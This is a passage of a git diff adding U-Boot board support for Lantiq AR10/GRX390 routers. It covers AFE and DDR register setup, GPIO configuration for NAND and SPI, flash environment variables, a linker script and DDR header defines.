+void WriteARCmem(u32 addr, u32 data){
+   mei_master(mei);
+   mei_dmp_acc();
+   REG32(mei_dbg_waddr_c) = addr;
+   REG32(mei_dbg_data_c) = data;
+   poll_status();
+   mei_master(jtag);
+};
+
+u32 afe_reg_read(u32 addr)
+{
+    WriteARCmem(CRI_EVENT2,0x20);
+    WriteARCmem(afe_addr_addr,addr);
+    WriteARCmem(afe_rdata_addr,0x0);
+    while((ReadARCmem(CRI_EVENT2)&0x20)!=0x20);
+    return(ReadARCmem(afe_rdata_addr));
+}
+
+u16 afe_reg_write(u32 addr,u32 data)
+{
+    WriteARCmem(afe_addr_addr,addr);
+    WriteARCmem(afe_wdata_addr,data);
+    while((ReadARCmem(CRI_EVENT2)&0x20)!=0x20);
+    return 0;
+}
+
+
+u32 ReadARCreg(u32 addr)
+{
+    u32 data;
+    mei_master(mei);
+    mei_aux_acc();
+    REG32(mei_dbg_raddr_c) = addr;
+    poll_status();
+    data = REG32(mei_dbg_data_c);
+    mei_master(jtag);
+    return data;
+};
+
+void WriteARCreg(u32 addr, u32 data)
+{
+    mei_master(mei);
+    mei_aux_acc();
+    REG32(mei_dbg_waddr_c) = addr;
+    REG32(mei_dbg_data_c) = data;
+    poll_status();
+    mei_master(jtag);
+};
+
+
+u16 enable_afe()
+{
+    u32 read_data,i;
+    REG32(AR10_PMU_PWDCR) &=0xffffffdf;
+	REG32(AR10_PMU_PWDCR1) |=0x10e00220;
+
+	REG32(AR10_PMU_PWDCR) &=0xfffffddf;
+ 
+    WriteARCreg(CRI_CCR0, 0x10);
+
+	WriteARCmem(0x32010, 0xf);
+
+    //asc_puts("Enabling AFE....\n");
+    /* Start the clock */
+    WriteARCmem(CRI_UPDCTL, 0x08);
+    
+	WriteARCmem(CRI_CCR0, 0x14);
+    WriteARCmem(CRI_CCR1, 0x500);
+    WriteARCmem(afe_config,0x01c8);
+    WriteARCmem(afe_serial_cfg,0x6); 
+    WriteARCmem(afe_tcr_0,0x5);
+    //Take afe out of reset
+    WriteARCmem(afe_config,0x0c0);
+    return(0);
+
+}
+
+void config_afe(void)
+{
+    u32 bias, bgp, dac_ftrim;
+    u32 ldo, data;
+
+    /*to make sure that AFE hard-macro registers are not reset upon soft reset*/
+    REG32(AR10_RCU_RST_PPE_CONF)= (REG32(AR10_RCU_RST_PPE_CONF) & ~0x1e)|0x18;
+
+    enable_afe();
+   
+	/*get BIAS & BGP from AFE_CTRL register*/
+    dac_ftrim = (REG32(AFE_CTRL)>>8) & 0x0f;
+	bias = REG32(AFE_CTRL)&0x1f;
+    bgp  = (REG32(AFE_CTRL)>>5) & 0x7;
+    /*write to BIAS_TRIM*/
+	data = bias | (bgp<<8);
+	afe_reg_write(0x31, data);
+
+    data = afe_reg_read(0x28);
+	data = (data & ~(0x0f))|(dac_ftrim);
+	afe_reg_write(0x28, data);
+
+    /*get 3 LDO bits from fuse string*/
+	ldo = (REG32(0xBF1073A4)>>16) & 0x7;
+    
+	/*write to afe reg offset 0x0e, bit 12 to 14*/
+    data = afe_reg_read(0x0e);
+    data = (data & ~(0x7<<12))|(ldo<<12);
+    afe_reg_write(0x0e, data);
+
+}
+#endif 
+
+
+/**********************************************************************************/
+
+#ifdef CONFIG_NOR_FLASH_AUTO
+void save_extra_env()
+{
+   extern flash_info_t flash_info[CFG_MAX_FLASH_BANKS];
+   extern xway_flash_partition_map_info flash_map[];
+   int i,j,total_db,total_part;
+   int mtd_part;
+   u32  tmp;
+   char strTemp[32], strCommand[128];
+   char strimg_addr[32],strimg_size[32],strimg_end[32];
+   i=0;
+   while(flash_map[i].size !=0){
+    	 if(flash_map[i].size == flash_info[0].size>>20) break;
+    	 i++;
+    }
+   total_db = 0;
+   mtd_part = -1; 
+   total_part = 0;
+   for(j=0;j<XWAY_MAX_BLOCK_NUM;j++){
+   	     if(strcmp(flash_map[i].block[j].blockName,"")!=0){
+   	     	 total_db++;
+   	     	 
+   	     	 sprintf(strTemp,"data_block%d",j);
+   	     	 if(!getenv(strTemp)) setenv(strTemp, flash_map[i].block[j].blockName);
+           sprintf(strTemp,"f_%s_addr",flash_map[i].block[j].blockName);
+           sprintf(strimg_addr,"0x%08x",flash_map[i].block[j].startAddr);
+           if(!getenv(strTemp)) setenv(strTemp,strimg_addr);
+           if(flash_map[i].block[j].mtdNum!=mtd_part){
+   	     	    mtd_part = flash_map[i].block[j].mtdNum;
+   	     	    total_part ++;
+   	     	    sprintf(strTemp, "part%d_begin", j);
+   	     	    if(!getenv(strTemp)) setenv(strTemp,strimg_addr);	
+   	     	 }
+           
+           	sprintf(strTemp,"f_%s_size",flash_map[i].block[j].blockName);
+            sprintf(strimg_size,"0x%08x",flash_map[i].block[j].sizeBytes);
+            if(!getenv(strTemp)) setenv(strTemp,strimg_size);
+            sprintf(strTemp,"f_%s_end",flash_map[i].block[j].blockName);
+            sprintf(strimg_end,"0x%08x", flash_map[i].block[j].startAddr + flash_map[i].block[j].sizeBytes - 1);
+            if(!getenv(strTemp)) setenv(strTemp,strimg_end);
+             	
+            if(strcmp(flash_map[i].block[j].blockName,"ubootconfig")==0) {
+           	   sprintf(strCommand,"prot off 0x%08x %s;erase 0x%08x %s 1",\
+           	           flash_map[i].block[j].startAddr,strimg_end,\
+           	           flash_map[i].block[j].startAddr,strimg_end);
+           	   sprintf(strTemp,"reset_uboot_config");
+           	   if(!getenv(strTemp)) setenv(strTemp,strCommand);        
+           	
+            }
+            
+                       
+        }
+    } 
+    sprintf(strTemp, "%d", total_db);
+    if(!getenv(strTemp)) setenv("total_db", strTemp);
+    sprintf(strTemp, "%d", total_part);
+    if(!getenv(strTemp)) setenv("total_part", strTemp);
+    sprintf(strTemp, "0x%08x", 0xb0000000 + flash_info[0].size);
+    if(!getenv(strTemp)) setenv("flash_end", strTemp);
+    sprintf(strTemp, "mtdparts");
+    if(!getenv(strTemp)) setenv(strTemp,flash_map[i].mtdparts);	
+    	
+   return;
+}
+#endif
+
+
+
+phys_size_t initdram(int board_type)
+{
+	return (1024*1024*CONFIG_IFX_MEMORY_SIZE);
+}
+
+
+int flash_probe(void)
+{
+     return 1;
+}
+
+
+void show_boot_progress(int arg)
+{
+  return;
+}
+
+void config_dcdc()
+{
+   REG8(DCDC_2V5_BASE+DCDC_PWM0_OFFSET)=0x8f;
+}
+
+int checkboard (void)
+{
+
+    printf("CLOCK CPU %dM RAM %dM\n",CPU_CLOCK_RATE/1000000,RAM_CLOCK_RATE/1000000);
+#ifdef CONFIG_AR10_DDR_8BIT
+    printf("8 Bit RAM\n");
+#else
+    printf("16 Bit RAM\n");
+#endif
+  
+    //*AR10_PMU_CLKGCR1_A |= ((1<<10)|(1<<5)) ; /*power up EBU*/ 
+    REG32(0xBF102024) = REG32(0xBF102020) | 0x00000400; //writing 1 in the PMU_CLKGCR1_A_ADDR[10]
+	REG32(0xBF102024) = REG32(0xBF102020) | 0x00000020; //writing 1 in the PMU_CLKGCR1_A_ADDR[5]
+		
+	*AR10_EBU_CLC = 0;
+    *AR10_EBU_ADDR_SEL_0 = 0x10000011;
+    *AR10_EBU_ADDR_SEL_1 = 0x14000021;  
+#ifdef CONFIG_AR10_PROGRAM_AFE_FUSE
+    config_afe();
+#endif
+
+#ifdef CONFIG_AR10_DCDC_2V5_PWM0    
+	config_dcdc();
+#endif	
+
+#ifdef CONFIG_DRIVER_GRX390
+    // disable dying gasp for grx390
+    REG32(AR10_RCU_USB1_Cfg) &= ~(1 << 3);
+    //set to 2.5V regulator output
+    REG32(AR10_RCU_USB1_Cfg) |= (1 << 6);
+#else 
+	if ((REG32(AR10_CHIPID) & 0x1)) {
+		REG32(AR10_PMU_CLKGCR1_B) |= (1 << 26);
+		REG32(AR10_PMU_CLKGCR2_B) |= (0x4e000000);
+		REG32(AR10_PMU_ANALOGCR_B) |= (1 << 10);
+	} 
+#endif
+
+#ifdef CONFIG_DRIVER_GRX390 
+	switch_mem_repair();
+#endif
+
+    return 0;
+}
+
+
+#ifdef CONFIG_NAND_FLASH
+void nand_gpio_init(void)
+{
+	 /* GPIO 13 NAND_ALE*/
+	 *AR10_GPIO_P0_DIR     |= 1 << 13;
+	 *AR10_GPIO_P0_ALTSEL0 |= 1 << 13;
+	 *AR10_GPIO_P0_ALTSEL1 &= ~(1 << 13);
+	 *AR10_GPIO_P0_OD      |= 1 << 13;
+	
+	 /*GPIO 24 NAND_CLE */
+	 *AR10_GPIO_P1_DIR     |= 1 << 8;
+	 *AR10_GPIO_P1_ALTSEL0 |= 1 << 8;
+	 *AR10_GPIO_P1_ALTSEL1 &= ~(1 << 8);
+	 *AR10_GPIO_P1_OD      |= 1 << 8;
+	 
+	 /*GPIO 48, NAND Ready_Busy*/
+	 /*GPIO 49, NAND_RD*/
+	 /*GPIO 50, NAND_D1*/
+	 /*GPIO 51, NAND_D0*/
+	 /*GPIO 52, NAND_D2*/
+	 /*GPIO 53, NAND_D2*/
+	 /*GPIO 54, NAND_D6*/
+	 /*GPIO 55, NAND_D5*/
+	 /*GPIO 56, NAND_D5*/
+	 /*GPIO 57, NAND_D3*/
+	 /*GPIO 59, NAND_WR*/
+	 /*GPIO 60, NAND_WP*/
+	 /*GPIO 61, NAND_SE*/
+	 *AR10_GPIO_P3_DIR     = 0x3ffe;
+	 *AR10_GPIO_P3_ALTSEL0 = 0x3fff;
+	 *AR10_GPIO_P3_ALTSEL1 = 0;
+	 *AR10_GPIO_P3_OD      = 0x3ffe;
+#ifdef CONFIG_NAND_CS0
+    /*GPIO 58, NAND_CS*/
+     *AR10_GPIO_P3_DIR     |= 1<<10;
+	 *AR10_GPIO_P3_ALTSEL0 |= 1<<10;
+	 *AR10_GPIO_P3_ALTSEL1 &= ~( 1<<10 );
+#else
+    /*GPIO 23, NAND_CS1*/
+   *AR10_GPIO_P1_DIR     |= 1 << 7;
+	 *AR10_GPIO_P1_ALTSEL0 |= 1 << 7;
+	 *AR10_GPIO_P1_ALTSEL1 &= ~(1 << 7); 
+#endif
+}
+#endif
+
+
+
+#ifdef CONFIG_LANTIQ_SPI
+
+int spi_gpio_init(unsigned int cs)
+{
+
+    *AR10_PMU_CLKGCR1_A |=1<<8;
+     
+	 /*p0.15 SPI_CS1*/
+	 *(AR10_GPIO_P0_DIR) |= 1<<15;
+	 *(AR10_GPIO_P0_ALTSEL0) |=1<<15;
+	 *(AR10_GPIO_P0_ALTSEL1) &=~(1<<15);
+
+     /*P1.0 SPI_DIN*/
+	 *(AR10_GPIO_P1_DIR) &=~1;
+	 *(AR10_GPIO_P1_ALTSEL0) |=1;
+	 *(AR10_GPIO_P1_ALTSEL1) &=~1;
+
+     /*P1.1 SPI_DOUT*/
+	 *(AR10_GPIO_P1_DIR) |=1<<1;
+	 *(AR10_GPIO_P1_ALTSEL0) |=1<<1;
+	 *(AR10_GPIO_P1_ALTSEL1) &=~(1<<1);
+			   
+     /*P1.2 SPI_CLK*/
+	 *(AR10_GPIO_P1_DIR) |=1<<2;
+	 *(AR10_GPIO_P1_ALTSEL0) |=1<<2;
+	 *(AR10_GPIO_P1_ALTSEL1) &=~(1<<2);
+			   
+     *AR10_GPIO_P0_OD = (*AR10_GPIO_P0_OD)|0xa000;
+	 *AR10_GPIO_P1_OD = (*AR10_GPIO_P1_OD)|0x0047;
+	 *AR10_GPIO_P0_OUT = (*AR10_GPIO_P0_OUT)|0x2000;
+			 
+	 return 1;																					 
+}
+#endif
+
+#ifdef CONFIG_AR10_LIF_DETECTION 
+void detect_lif(void)
+{
+     u32 lif_type=0;
+		 u32 dir, alt0, alt1;
+     char lif_type_string[]="LIF_TYPE";
+		 char buf[32];
+		 dir=*(AR10_GPIO_P0_DIR);
+		 alt0=*(AR10_GPIO_P0_ALTSEL0);
+		 alt1=*(AR10_GPIO_P0_ALTSEL1);
+		 *(AR10_GPIO_P0_DIR) &=~(1<<10);
+		 *(AR10_GPIO_P0_ALTSEL0) &=~(1<<10);
+		 *(AR10_GPIO_P0_ALTSEL1) &=~(1<<10);
+     lif_type = (*(AR10_GPIO_P0_IN) >> 10) & 0x1;
+     *(AR10_GPIO_P0_DIR)=dir;
+		 *(AR10_GPIO_P0_ALTSEL0)=alt0;
+     *(AR10_GPIO_P0_ALTSEL1)=alt1;
+
+		 dir=*(AR10_GPIO_P3_DIR);
+		 alt0=*(AR10_GPIO_P3_ALTSEL0);
+		 alt1=*(AR10_GPIO_P3_ALTSEL1);
+	   *(AR10_GPIO_P3_DIR) &=~(1<<10);
+	   *(AR10_GPIO_P3_ALTSEL0) &=~(1<<10);
+	   *(AR10_GPIO_P3_ALTSEL1) &=~(1<<10); 
+     lif_type |= ((*(AR10_GPIO_P3_IN) >> 10 ) & 0x1)<<1;
+		 *(AR10_GPIO_P3_DIR)=dir;
+     *(AR10_GPIO_P3_ALTSEL0)=alt0;
+     *(AR10_GPIO_P3_ALTSEL1)=alt1;
+     printf("lif_type=%d\n",lif_type);
+     sprintf(buf, "%d", lif_type);
+		 setenv(lif_type_string, buf);
+} 
+#endif
+
+#ifdef CONFIG_TUNE_DDR
+
+int get_tuned_param(ulong* buffer)
+{
+    int    ret= 1;
+    ulong  ddr_magic=0x88888888;
+    ulong  ecc;
+
+    if (REG32(CONFIG_TUNING_STATUS)!=0x2) {
+         ret = 0;
+         goto EXIT;
+    }
+
+    buffer[0]= ddr_magic;
+    buffer[1]= REG32(0xBE1A7F10);
+    buffer[2]= REG32(0xBE1A7F14);
+    buffer[3]= REG32(0xBE1A7F18);
+    buffer[4]= REG32(0xBE1A7F1C);
+    buffer[5]= REG32(CSS_DDR_ECHO_DLL0);
+    buffer[6]= REG32(CSS_DDR_ECHO_DLL1);
+    buffer[7]= buffer[1]^buffer[2]^buffer[3]^buffer[4]^buffer[5]^buffer[6];
+EXIT:
+    return ret;
+}
+
+#if defined(CONFIG_BOOT_FROM_NAND)
+extern nand_info_t nand_info[]; 
+//extern int nand_write (struct mtd_info *mtd, loff_t to, size_t len, size_t * retlen, const u_char * buf);
+
+void save_ddr_param(void)
+{   
+	   ulong  buffer[8];
+	   u64 srcLen=32;
+#ifdef CONFIG_AR10_LIF_DETECTION       
+	    detect_lif(); 
+#endif	   
+           if(!get_tuned_param(&buffer)) return;
+           nand_write_partial(&nand_info[0], IFX_CFG_FLASH_DDR_CFG_START_ADDR, &srcLen,(u_char*)buffer);
+	   return;
+}
+#else /*BOOT from SPI*/
+void save_ddr_param(void)
+{
+	 ulong  buffer[8];
+	 static struct spi_flash *flash_spi;
+#ifdef CONFIG_AR10_LIF_DETECTION       
+	    detect_lif(); 
+#endif	
+	 if(!get_tuned_param(&buffer)) return;
+	 flash_spi = spi_flash_probe(CONFIG_ENV_SPI_BUS, CONFIG_ENV_SPI_CS,
+            CONFIG_ENV_SPI_MAX_HZ, CONFIG_ENV_SPI_MODE);
+	 spi_flash_write(flash_spi, IFX_CFG_FLASH_DDR_CFG_START_ADDR, IFX_CFG_FLASH_DDR_CFG_SIZE, (char *)buffer);   
+	 printf("saved ddr param in flash!\n");    
+	    
+
+	 return; 
+}
+#endif
+#endif
+
+
+int board_eth_init(bd_t *bis)
+{
+   if (ar10_eth_initialize(bis)<0)
+             return -1;
+
+	return 0;
+}
+
+/* Fix memory locations in switch */
+#ifdef CONFIG_DRIVER_GRX390
+int switch_mem_repair(void)
+{
+	int i;
+	u32 read_fuse_bits;
+
+	REG32(RST_REQ) = (REG32(RST_REQ) & 0xFEFFFFFF); // setting bit 24 to 0, wlan hardware reset
+	REG32(RST_REQ2) = (REG32(RST_REQ2) & 0xFFFFFDFF); // setting bit 9 to 0, wlan mips reset
+
+	while((REG32(RST_STAT2) | 0xfffffdff) !=  0xfffffdff); //waiting for wlan to come out of reset
+
+	//Assert Fuse_en- check
+	REG32(RST_REQ2) = (REG32(RST_REQ2) | 0x00800000); //Set fuse_en bit in RCU
+
+	for (i = 0; i < NO_OF_FUSES; i++) {
+		read_fuse_bits = (REG32(PPE_SW_WLAN_RFUSE_BASE_ADDRESS + i * 0x4) & 0x0007FFFF); //Read Least significant 19 bits
+		/* only fix the switch mem */	
+		if (read_fuse_bits & 0x00060000) {
+			update_switch_mem_locations(((read_fuse_bits >> 14) & 0x0000000F), 
+                    ((read_fuse_bits >> 13)  & 0x00000001), (read_fuse_bits & 0x00001FFF)); //Switch Address width [12:0]
+		}
+	}//End for loop
+
+	REG32(RST_REQ2) = (REG32(RST_REQ2) & 0xFF7FFFFF); //deassert fuse_en bit in RCU			
+
+}
+
+void update_switch_mem_locations(u32 mem_id, u32 rar0_1, u32 addr)
+{
+	u16 rar_addr;
+	int i;
+	addr = addr | 0x2000;                   //Setting valid marker bit
+		switch(mem_id){
+		case(0x9):
+			if(rar0_1) rar_addr = 8;        //SSB0, RAR1
+			else rar_addr = 0;              //SSB0, RAR0
+			break;
+
+		case(0xA):
+			if(rar0_1) rar_addr = 10;       //SSB1, RAR1
+			else rar_addr = 2;              //SSB1, RAR0
+			break;
+
+		case(0xB):
+			if(rar0_1) rar_addr = 12;       //SSB2, RAR1
+			else rar_addr = 4;              //SSB2, RAR0
+			break;
+
+		case(0xC):
+			if(rar0_1) rar_addr = 14;       //SSB3, RAR1
+			else rar_addr = 6;              //SSB3, RAR0
+			break;
+
+		default: 
+			break;
+	}
+
+	printf("Memory fix at location 0x%08x to location 0x%08x\n",
+				addr, rar_addr);
+
+	REG32(ADR_ETHSW_TOP_PDI_ETHSW_SSB_DATA) = addr;			//Faulty address to be written onto RAR
+	REG32(ADR_ETHSW_TOP_PDI_ETHSW_SSB_ADDR) = rar_addr;		//Address of RAR 
+	REG32(ADR_ETHSW_TOP_PDI_ETHSW_SSB_MODE) = 0x01;     	//Write command, upper four bits of addr are zero
+	while(REG32(ADR_ETHSW_TOP_PDI_ETHSW_SSB_MODE) != 0x0);	//self clear register. CLears just before executing transaction.
+}
+#endif /* CONFIG_DRIVER_GRX390 */
diff --git a/board/ar10/bootstrap.lds b/board/ar10/bootstrap.lds
new file mode 100644
--- /dev/null
+++ b/board/ar10/bootstrap.lds
@@ -0,0 +1,72 @@
+/*
+ * (C) Copyright 2003
+ * Wolfgang Denk Engineering, <wd@denx.de>
+ *
+ * See file CREDITS for list of people who contributed to this
+ * project.
+ *
+ * This program is free software; you can redistribute it and/or
+ * modify it under the terms of the GNU General Public License as
+ * published by the Free Software Foundation; either version 2 of
+ * the License, or (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+ * MA 02111-1307 USA
+ */
+
+/*
+OUTPUT_FORMAT("elf32-bigmips", "elf32-bigmips", "elf32-bigmips")
+*/
+OUTPUT_FORMAT("elf32-tradbigmips", "elf32-tradbigmips", "elf32-tradbigmips")
+OUTPUT_ARCH(mips)
+ENTRY(_start)
+SECTIONS
+{
+        . = 0x00000000;
+
+        . = ALIGN(4);
+	.text       :
+	{
+	  *(.text)
+	}
+
+        . = ALIGN(4);
+        .rodata  : { *(.rodata) }
+
+        . = ALIGN(4);
+        .data  : { *(.data) }
+
+	. = ALIGN(4);
+	.sdata  : { *(.sdata) }
+
+	_gp = ALIGN(16);
+
+	. = ALIGN(16);
+	__got_start = .;
+	.got  : { *(.got) }
+	__got_end = .;
+
+	.sdata  : { *(.sdata) }
+
+	. = .;
+        __u_boot_cmd_start = .;
+        .u_boot_cmd : { *(.u_boot_cmd) }
+        __u_boot_cmd_end = .;
+
+    . = ALIGN(4);
+	uboot_end_data = .;
+	got_size = (__got_end - __got_start);
+	num_got_entries = (__got_end - __got_start) >> 2;
+
+  . = ALIGN(4);
+	.sbss  : { *(.sbss) }
+        .bss  : { *(.bss) }
+	uboot_end = .;
+}
diff --git a/board/ar10/config.mk b/board/ar10/config.mk
new file mode 100644
--- /dev/null
+++ b/board/ar10/config.mk
@@ -0,0 +1,27 @@
+#
+# (C) Copyright 2003
+# Wolfgang Denk, DENX Software Engineering, wd@denx.de.
+#
+# See file CREDITS for list of people who contributed to this
+# project.
+#
+# This program is free software; you can redistribute it and/or
+# modify it under the terms of the GNU General Public License as
+# published by the Free Software Foundation; either version 2 of
+# the License, or (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program; if not, write to the Free Software
+# Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+# MA 02111-1307 USA
+#
+
+-include $(TOPDIR)/.config
+
+TEXT_BASE = $(CONFIG_RAM_TEXT_BASE)
+
diff --git a/board/ar10/ddr.h b/board/ar10/ddr.h
new file mode 100755
--- /dev/null
+++ b/board/ar10/ddr.h
@@ -0,0 +1,307 @@
+/*
+ * This is just an example of how to select the DDR setting header files for Lantiq reference boards.
+ * User should use his own setting files according to the real DDR chip used on his own boards.
+*/
+
+#ifdef CONFIG_AR10_DDR2
+ #if defined(CONFIG_AR10_CPU_150M_RAM_150M) || defined(CONFIG_AR10_CPU_300M_RAM_150M) || \
+     defined(CONFIG_AR10_CPU_600M_RAM_150M) || defined(CONFIG_AR10_CPU_250M_RAM_125M) || \
+	 defined(CONFIG_AR10_CPU_125M_RAM_125M) || defined(CONFIG_GRX390_CPU_180M_RAM_180M) || \
+	 defined(CONFIG_GRX390_CPU_360M_RAM_180M)
+    #ifdef CONFIG_AR10_DDR_8BIT
+     #include "ddr2/xrx300_ddr2_8bit_150M_settings.h"
+	#else
+     #include "ddr2/xrx300_ddr2_150M_settings.h"
+	#endif 
+ #elif defined(CONFIG_AR10_CPU_500M_RAM_250M) || defined(CONFIG_AR10_CPU_250M_RAM_250M) 
+    #ifdef CONFIG_AR10_DDR_8BIT
+     #include "ddr2/xrx300_ddr2_8bit_250M_settings.h"
+    #else
+	   #if (CONFIG_IFX_MEMORY_SIZE == 256 )
+         #include "ddr2/xrx300_ddr2_SZ256M_CLK250M_settings.h"
+	   #else
+         #include "ddr2/xrx300_ddr2_250M_settings.h" 
+	   #endif
+    #endif
+ #elif defined(CONFIG_AR10_CPU_600M_RAM_300M) || defined(CONFIG_AR10_CPU_300M_RAM_300M)
+    #ifdef CONFIG_AR10_DDR_8BIT
+     #include "ddr2/xrx300_ddr2_8bit_250M_settings.h"
+    #else
+       #if (CONFIG_IFX_MEMORY_SIZE == 256 )
+	     #include "ddr2/xrx300_ddr2_SZ256M_CLK300M_settings.h"
+	   #else
+         #include "ddr2/xrx300_ddr2_300M_settings.h"
+	   #endif
+    #endif
+ #elif defined(CONFIG_GRX390_CPU_720M_RAM_360M) || defined(CONFIG_GRX390_CPU_360M_RAM_360M)
+	#ifdef CONFIG_AR10_DDR_8BIT
+	 #include "ddr2/grx390_ddr2_8bit_360M_settings.h"
+	#else
+	  #if (CONFIG_IFX_MEMORY_SIZE == 256 )
+       #include "ddr2/grx390_ddr2_SZ256M_CLK360M_settings.h"
+	  #else
+	   #include "ddr2/grx390_ddr2_360M_settings.h"
+	  #endif 
+	#endif
+ #elif defined(CONFIG_GRX390_CPU_666M_RAM_333M)
+	#ifdef CONFIG_AR10_DDR_8BIT
+	 #include "ddr2/grx390_ddr2_8bit_333M_settings.h"
+	#else
+      #if (CONFIG_IFX_MEMORY_SIZE == 256 )
+ 	   #include "ddr2/grx390_ddr2_SZ256M_CLK333M_settings.h"
+	  #else
+       #include "ddr2/grx390_ddr2_333M_settings.h"
+	  #endif
+	#endif
+ #elif defined(CONFIG_GRX390_CPUFREQ_AUTO_DETECT)
+ 	#if (CONFIG_IFX_MEMORY_SIZE == 256)
+	 #include "ddr2/grx390_ddr2_SZ256M_CLK360M_settings.h"
+	 #include "ddr2/xrx300_ddr2_SZ256M_CLK300M_settings.h"
+	#else
+	 #include "ddr2/grx390_ddr2_360M_settings.h"
+	 #include "ddr2/xrx300_ddr2_300M_settings.h"
+	#endif
+ #endif
+#elif CONFIG_AR10_DDR1
+ #if defined(CONFIG_AR10_CPU_150M_RAM_150M) || defined(CONFIG_AR10_CPU_300M_RAM_150M) || \
+     defined(CONFIG_AR10_CPU_600M_RAM_150M) || defined(CONFIG_AR10_CPU_250M_RAM_125M) || \
+     defined(CONFIG_AR10_CPU_125M_RAM_125M)
+   #ifdef CONFIG_AR10_DDR_8BIT
+     #include "ddr1/xrx300_ddr1_8bit_250M_settings.h"
+   #else
+     #include "ddr1/xrx300_ddr1_250M_settings.h"
+   #endif
+  #elif defined(CONFIG_AR10_CPU_500M_RAM_250M) || defined(CONFIG_AR10_CPU_250M_RAM_250M) || \
+     defined(CONFIG_AR10_CPU_600M_RAM_300M) || defined(CONFIG_AR10_CPU_300M_RAM_300M)
+    #ifdef CONFIG_AR10_DDR_8BIT
+      #include "ddr1/xrx300_ddr1_8bit_250M_settings.h"
+	#else
+      #include "ddr1/xrx300_ddr1_250M_settings.h"
+	#endif
+  #endif 
+#endif
+
+#define DDR_OFFSET   0xbf801000
+#define DDR_CCR00      (DDR_OFFSET + 0x0000 )
+#define DDR_CCR01      (DDR_OFFSET + 0x0010 )
+#define DDR_CCR02      (DDR_OFFSET + 0x0020 )
+#define DDR_CCR03      (DDR_OFFSET + 0x0030 )
+#define DDR_CCR04      (DDR_OFFSET + 0x0040 )
+#define DDR_CCR05      (DDR_OFFSET + 0x0050 )
+#define DDR_CCR06      (DDR_OFFSET + 0x0060 )
+#define DDR_CCR07      (DDR_OFFSET + 0x0070 )
+#define DDR_CCR08      (DDR_OFFSET + 0x0080 )
+#define DDR_CCR09      (DDR_OFFSET + 0x0090 )
+#define DDR_CCR10      (DDR_OFFSET + 0x00A0 )
+#define DDR_CCR11      (DDR_OFFSET + 0x00B0 )
+#define DDR_CCR12      (DDR_OFFSET + 0x00C0 )
+#define DDR_CCR13      (DDR_OFFSET + 0x00D0 )
+#define DDR_CCR14      (DDR_OFFSET + 0x00E0 )
+#define DDR_CCR15      (DDR_OFFSET + 0x00F0 )
+#define DDR_CCR16      (DDR_OFFSET + 0x0100 )
+#define DDR_CCR17      (DDR_OFFSET + 0x0110 )
+#define DDR_CCR18      (DDR_OFFSET + 0x0120 )
+#define DDR_CCR19      (DDR_OFFSET + 0x0130 )
+#define DDR_CCR20      (DDR_OFFSET + 0x0140 )
+#define DDR_CCR21      (DDR_OFFSET + 0x0150 )
+#define DDR_CCR22      (DDR_OFFSET + 0x0160 )
+#define DDR_CCR23      (DDR_OFFSET + 0x0170 )
+#define DDR_CCR24      (DDR_OFFSET + 0x0180 )
+#define DDR_CCR25      (DDR_OFFSET + 0x0190 )
+#define DDR_CCR26      (DDR_OFFSET + 0x01A0 )
+#define DDR_CCR27      (DDR_OFFSET + 0x01B0 )
+#define DDR_CCR28      (DDR_OFFSET + 0x01C0 )
+#define DDR_CCR29      (DDR_OFFSET + 0x01D0 )
+#define DDR_CCR30      (DDR_OFFSET + 0x01E0 )
+#define DDR_CCR31      (DDR_OFFSET + 0x01F0 )
+#define DDR_CCR32      (DDR_OFFSET + 0x0200 )
+#define DDR_CCR33      (DDR_OFFSET + 0x0210 )
+#define DDR_CCR34      (DDR_OFFSET + 0x0220 )
+#define DDR_CCR35      (DDR_OFFSET + 0x0230 )
+#define DDR_CCR36      (DDR_OFFSET + 0x0240 )
+#define DDR_CCR37      (DDR_OFFSET + 0x0250 )
+#define DDR_CCR38      (DDR_OFFSET + 0x0260 )
+#define DDR_CCR39      (DDR_OFFSET + 0x0270 )
+#define DDR_CCR40      (DDR_OFFSET + 0x0280 )
+#define DDR_CCR41      (DDR_OFFSET + 0x0290 )
+#define DDR_CCR42      (DDR_OFFSET + 0x02A0 )
+#define DDR_CCR43      (DDR_OFFSET + 0x02B0 )
+#define DDR_CCR44      (DDR_OFFSET + 0x02C0 )
+#define DDR_CCR45      (DDR_OFFSET + 0x02D0 )
+#define DDR_CCR46      (DDR_OFFSET + 0x02E0 )
+#define DDR_CCR47      (DDR_OFFSET + 0x02F0 )
+#define DDR_CCR48      (DDR_OFFSET + 0x0300 )
+#define DDR_CCR49      (DDR_OFFSET + 0x0310 )
+#define DDR_CCR50      (DDR_OFFSET + 0x0320 )
+#define DDR_CCR51      (DDR_OFFSET + 0x0330 )
+#define DDR_CCR52      (DDR_OFFSET + 0x0340 )
+#define DDR_CCR53      (DDR_OFFSET + 0x0350 )
+#define DDR_CCR54      (DDR_OFFSET + 0x0360 )
+#define DDR_CCR55      (DDR_OFFSET + 0x0370 )
+#define DDR_PHYR0      (DDR_OFFSET + 0x0400 )
+#define DDR_PHYR1      (DDR_OFFSET + 0x0410 )
+#define DDR_PHYR2      (DDR_OFFSET + 0x0420 )
+#define DDR_PHYR3      (DDR_OFFSET + 0x0430 )
+#define DDR_PHYR4      (DDR_OFFSET + 0x0440 )
+#define DDR_PHYR5      (DDR_OFFSET + 0x0450 )
+#define DDR_PHYR6      (DDR_OFFSET + 0x0460 )
+#define DDR_PHYR7      (DDR_OFFSET + 0x0470 )
+#define DDR_PHYR8      (DDR_OFFSET + 0x0480 )
+#define DDR_PHYR9      (DDR_OFFSET + 0x0490 )
+#define DDR_PHYR10     (DDR_OFFSET + 0x04A0 )
+#define DDR_PHYR11     (DDR_OFFSET + 0x04B0 )
+#define DDR_PHYR12     (DDR_OFFSET + 0x04C0 )
+#define DDR_PHYR13     (DDR_OFFSET + 0x04D0 )
+#define DDR_PHYR14     (DDR_OFFSET + 0x04E0 )
+#define DDR_PHYR15     (DDR_OFFSET + 0x04F0 )
+
+
+
+typedef struct ddr_setting{
+   u32 addr;
